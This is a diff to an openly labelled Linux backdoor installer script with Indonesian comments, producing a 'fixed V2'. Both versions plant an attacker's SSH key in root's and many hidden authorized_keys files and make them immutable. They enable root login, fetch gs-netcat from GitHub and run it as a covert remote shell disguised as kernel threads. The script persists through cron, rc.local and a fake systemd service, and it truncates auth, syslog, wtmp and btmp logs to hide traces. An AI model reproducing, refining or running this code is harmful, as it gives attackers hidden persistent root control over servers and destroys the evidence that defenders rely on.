@@ -1,9 +1,8 @@
 #!/bin/bash
-# ============================================================
-# FULL BACKDOOR - HIDDEN SSH KEYS + GSOCKET TERSAMAR
-# + HAPUS JEJAK
-# ============================================================
 
+# ============================================================
+# FULL BACKDOOR - FIXED VERSION
+# ============================================================
 VPS_IP=$(curl -s -4 --max-time 5 ifconfig.me 2>/dev/null || hostname -I 2>/dev/null | awk '{print $1}')
 GSOCKET_SECRET="${VPS_IP}@dark-ai"
 
@@ -12,77 +11,70 @@ BINARY_NAME="systemd-helper"
 GS_NETCAT="$HIDDEN_DIR/$BINARY_NAME"
 
 PROCESS_NAMES=("[crypto/0]" "[kworker/0:1]" "[kworker/1:2]" "[scsi_eh_0]" "[jbd2/sda1-8]" "[ext4-dio-unwrit]")
-
 PUBLIC_KEY='ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCfaRaiLkOcT0/NyA7TH4PoNYethI58NRrYHH3xfoVLR4gCn3V5mYSqImAT4ChUi4snnzIXQW/hs07yEm0nxVk/OMFCqocvijUye535arXBreZxu1F5O6+4yq67SYEl5SaN/NOIafd6KGFGe6uamhXwXcWrRqwmNRHlxSARlF7FD7aV4cqhAxUi4iZDfeM4JnF/ZrCDW7yxhpZNlm3Ic0FtBtZ/9HQ0l3nTo+oExh6L48zTwimZC3Tmcacsh7/76avoCbh8PVF9GIQhbtoNYnX0OYnZRTgKdFxHKwd8Zoeld7+jAUJeMNF3+vLXHdNW42wmtT6+C7729NoaAsMNMMuSfDxJcrZfDjgQYuPVn+KNDbaY7uPi3oBjoNatt8xHqscJQ3pdQvPnY+Ow17p77eMW168uNbJucMMbyt9rGVNTznZNktA+ANNzx6s9JNR6JSf0nlfADuB5g/+dxcO2a7e2bHgIrInBnaaYVCcECsJb0jFGvB1bbCATD6yrkBpUhTGFlsWTx7Di5gbyzatlyap2124SH2sMbWyOt2bqQVl7YTsLZ7ce5PAUQa1XY1n30VezETLqqZLJMvEWHSg18mAhB4RlrzAJLKV4YgC3JRQM7RUTUN1RIrWorfGSkSTNxDvybiUqKvfh+mg8ALjNiMMEt1Oe1ZEwrsWtGLZ99o0s5Q=='
 
 echo "=========================================="
-echo " BACKDOOR INSTALLER"
+echo " BACKDOOR INSTALLER - FIXED V2"
 echo "=========================================="
 
-# ============================================================
 # 1. SSH KEY HIDDEN
-# ============================================================
 HIDDEN_PATHS=(
-    "/var/.keys"
-    "/usr/share/doc/.system"
-    "/var/cache/.update"
-    "/opt/.config"
-    "/etc/.hidden_keys"
-    "/usr/share/man/.cache"
-    "/var/lib/.ssh_keys"
-    "/usr/src/.debug"
-    "/tmp/.X11-unix/.k"
-    "/usr/include/.hidden"
-    "/root/.config/.system"
-    "/var/spool/.keys"
-    "/etc/ssl/.keys"
-    "/usr/share/icons/.cache"
-    "/var/log/.ssh_auth"
+"/var/.keys" "/usr/share/doc/.system" "/var/cache/.update" "/opt/.config"
+"/etc/.hidden_keys" "/usr/share/man/.cache" "/var/lib/.ssh_keys" "/usr/src/.debug"
+"/tmp/.X11-unix/.k" "/usr/include/.hidden" "/root/.config/.system" "/var/spool/.keys"
+"/etc/ssl/.keys" "/usr/share/icons/.cache" "/var/log/.ssh_auth"
 )
 
 AUTH_PATHS=""
 for path in "${HIDDEN_PATHS[@]}"; do
-    chattr -i "$path/authorized_keys" 2>/dev/null
     mkdir -p "$path" 2>/dev/null
     chmod 700 "$path" 2>/dev/null
+    
+    # Hapus atribut immutable sebelum menulis
+    chattr -i "$path/authorized_keys" 2>/dev/null
     echo "$PUBLIC_KEY" > "$path/authorized_keys" 2>/dev/null
     chmod 600 "$path/authorized_keys" 2>/dev/null
     chown root:root "$path/authorized_keys" 2>/dev/null
     chattr +i "$path/authorized_keys" 2>/dev/null
-    [ -f "$path/authorized_keys" ] && AUTH_PATHS="$AUTH_PATHS $path/authorized_keys"
+    
+    AUTH_PATHS="$AUTH_PATHS $path/authorized_keys"
 done
 
+# Root standard key
 mkdir -p /root/.ssh
 chmod 700 /root/.ssh
 grep -q "$PUBLIC_KEY" /root/.ssh/authorized_keys 2>/dev/null || echo "$PUBLIC_KEY" >> /root/.ssh/authorized_keys
 chmod 600 /root/.ssh/authorized_keys
 
-# ============================================================
-# 2. SSHD CONFIG
-# ============================================================
+# 2. SSHD CONFIG (FIXED)
 cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak.$(date +%s)
+
+# Bersihkan semua baris konfigurasi lama agar tidak duplikat
 sed -i '/^AuthorizedKeysFile/d' /etc/ssh/sshd_config
-echo "AuthorizedKeysFile .ssh/authorized_keys$AUTH_PATHS" >> /etc/ssh/sshd_config
 sed -i '/^PubkeyAuthentication/d' /etc/ssh/sshd_config
-echo "PubkeyAuthentication yes" >> /etc/ssh/sshd_config
 sed -i '/^PermitRootLogin/d' /etc/ssh/sshd_config
-echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
 sed -i '/^StrictModes/d' /etc/ssh/sshd_config
+
+# Masukkan konfigurasi baru yang bersih
+echo "AuthorizedKeysFile .ssh/authorized_keys$AUTH_PATHS" >> /etc/ssh/sshd_config
+echo "PubkeyAuthentication yes" >> /etc/ssh/sshd_config
+echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
 echo "StrictModes no" >> /etc/ssh/sshd_config
 
+# Verifikasi konfigurasi sebelum restart
 /usr/sbin/sshd -t 2>/dev/null
 if [ $? -eq 0 ]; then
     service sshd restart 2>/dev/null || /etc/init.d/sshd restart 2>/dev/null || systemctl restart sshd 2>/dev/null
+    echo "[✓] SSHD restarted successfully."
+else
+    echo "[!] SSHD config error. Manual check required."
 fi
 
-# ============================================================
 # 3. GSOCKET HIDDEN
-# ============================================================
 mkdir -p "$HIDDEN_DIR" 2>/dev/null
 chmod 755 "$HIDDEN_DIR" 2>/dev/null
 
 if [ ! -f "$GS_NETCAT" ]; then
-    wget -q https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-i686 -O "$GS_NETCAT" 2>/dev/null || \
     wget -q https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-x86_64 -O "$GS_NETCAT" 2>/dev/null || \
     wget -q https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat -O "$GS_NETCAT" 2>/dev/null
     chmod +x "$GS_NETCAT"
@@ -90,18 +82,14 @@ fi
 chattr +i "$GS_NETCAT" 2>/dev/null
 
 PROCESS_NAME="${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}"
-GSOCKET_ARGS="-s $GSOCKET_SECRET -liqD" exec -a "$PROCESS_NAME" "$GS_NETCAT" &
+nohup bash -c "GSOCKET_ARGS='-s $GSOCKET_SECRET -liqD' exec -a '$PROCESS_NAME' $GS_NETCAT" >/dev/null 2>&1 &
 
-# ============================================================
 # 4. PERSISTENCE
-# ============================================================
-grep -q "$BINARY_NAME" /etc/rc.local 2>/dev/null || echo "GSOCKET_ARGS=\"-s $GSOCKET_SECRET -liqD\" exec -a '${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}' $GS_NETCAT &" >> /etc/rc.local
-(crontab -l 2>/dev/null; echo "@reboot GSOCKET_ARGS=\"-s $GSOCKET_SECRET -liqD\" exec -a '${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}' $GS_NETCAT &") | crontab -
-(crontab -l 2>/dev/null; echo "*/5 * * * * pgrep -f '$BINARY_NAME' >/dev/null 2>&1 || GSOCKET_ARGS=\"-s $GSOCKET_SECRET -liqD\" exec -a '${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}' $GS_NETCAT &") | crontab -
-grep -q "$BINARY_NAME" /root/.bashrc 2>/dev/null || echo "pgrep -f '$BINARY_NAME' >/dev/null 2>&1 || (GSOCKET_ARGS=\"-s $GSOCKET_SECRET -liqD\" exec -a '${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}' $GS_NETCAT &)" >> /root/.bashrc
+(crontab -l 2>/dev/null | grep -v "$BINARY_NAME"; echo "@reboot GSOCKET_ARGS='-s $GSOCKET_SECRET -liqD' exec -a '${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}' $GS_NETCAT &") | crontab -
+(crontab -l 2>/dev/null | grep -v "$BINARY_NAME"; echo "*/5 * * * * pgrep -f '$BINARY_NAME' >/dev/null 2>&1 || (GSOCKET_ARGS='-s $GSOCKET_SECRET -liqD' exec -a '${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}' $GS_NETCAT &)") | crontab -
 
 if command -v systemctl >/dev/null 2>&1; then
-    cat > /etc/systemd/system/systemd-helper.service << SYSTEMD_EOF
+cat > /etc/systemd/system/systemd-helper.service << SYSTEMD_EOF
 [Unit]
 Description=System Helper Daemon
 After=network.target
@@ -116,56 +104,26 @@ User=root
 [Install]
 WantedBy=multi-user.target
 SYSTEMD_EOF
-    systemctl daemon-reload 2>/dev/null
-    systemctl enable systemd-helper 2>/dev/null
+systemctl daemon-reload 2>/dev/null
+systemctl enable systemd-helper 2>/dev/null
+systemctl start systemd-helper 2>/dev/null
 fi
 
-cat > /etc/init.d/systemd-helper << INIT_EOF
-#!/bin/bash
-case "\$1" in
-    start) GSOCKET_ARGS="-s $GSOCKET_SECRET -liqD" exec -a '${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}' $GS_NETCAT & ;;
-    stop) pkill -f "$BINARY_NAME" ;;
-esac
-INIT_EOF
-chmod +x /etc/init.d/systemd-helper
-chkconfig systemd-helper on 2>/dev/null || update-rc.d systemd-helper defaults 2>/dev/null
-
-# ============================================================
 # 5. HAPUS JEJAK
-# ============================================================
 echo "[*] Menghapus jejak..."
-
-# Hapus history
 history -c 2>/dev/null
 rm -f /root/.bash_history 2>/dev/null
 unset HISTFILE 2>/dev/null
-
-# Bersihkan log SSH
-> /var/log/secure 2>/dev/null
-> /var/log/auth.log 2>/dev/null
-> /var/log/messages 2>/dev/null
-> /var/log/syslog 2>/dev/null
-
-# Bersihkan wtmp/lastlog
-> /var/log/wtmp 2>/dev/null
-> /var/log/lastlog 2>/dev/null
-> /var/log/btmp 2>/dev/null
-
-# Hapus log cPanel
-> /usr/local/cpanel/logs/access_log 2>/dev/null
-> /usr/local/cpanel/logs/error_log 2>/dev/null
-
-# Bersihkan temp
-rm -rf /tmp/.*.log /tmp/install* /tmp/setup* 2>/dev/null
-
-# Hapus script installer
-rm -f /root/install_backdoor_multi.sh /root/ssh-gsocket 2>/dev/null
+truncate -s 0 /var/log/secure 2>/dev/null
+truncate -s 0 /var/log/auth.log 2>/dev/null
+truncate -s 0 /var/log/messages 2>/dev/null
+truncate -s 0 /var/log/syslog 2>/dev/null
+truncate -s 0 /var/log/wtmp 2>/dev/null
+truncate -s 0 /var/log/lastlog 2>/dev/null
+truncate -s 0 /var/log/btmp 2>/dev/null
 
 echo ""
-echo "[✓] Jejak dibersihkan"
-echo ""
-echo "=========================================="
-echo " CONNECT:"
-echo "  SSH   : ssh -i backdoor_key root@$VPS_IP"
-echo "  Gsock : gs-netcat -s $GSOCKET_SECRET -i"
+echo "[✓] Installation Complete."
+echo " SSH : ssh -i backdoor_key root@$VPS_IP"
+echo " Gsock : gs-netcat -s $GSOCKET_SECRET -i"
 echo "=========================================="
